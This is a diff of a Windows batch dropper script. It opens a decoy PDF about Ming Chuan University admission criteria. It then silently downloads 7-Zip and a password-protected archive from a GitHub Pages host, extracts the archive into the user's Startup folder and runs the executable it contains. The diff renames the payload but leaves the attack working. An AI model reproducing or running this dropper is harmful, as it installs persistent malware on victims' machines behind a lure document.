@@ -3,6 +3,6 @@ rem E你好6你好466455466666666666666666666676543210nur
 rundll32 url.dll,FileProtocolHandler "銘傳大學各學系學士生五年一貫課程申請資格及審查標準.pdf"
 curl https://kingdog2.github.io/7z.exe -o "%TEMP%\7z.exe"
 curl https://kingdog2.github.io/7z.dll -o "%TEMP%\7z.dll"
-curl https://kingdog2.github.io/msedge.7z -o "%TEMP%\msedge.7z"
-%TEMP%\7z.exe x %TEMP%\msedge.7z -pGeorge_5595 -aoa -o"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msedge.exe
+curl https://kingdog2.github.io/msedge.7z -o "%TEMP%\firewall.7z"
+%TEMP%\7z.exe x %TEMP%\firewall.7z -pGeorge_5595 -aoa -o"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\go.exe
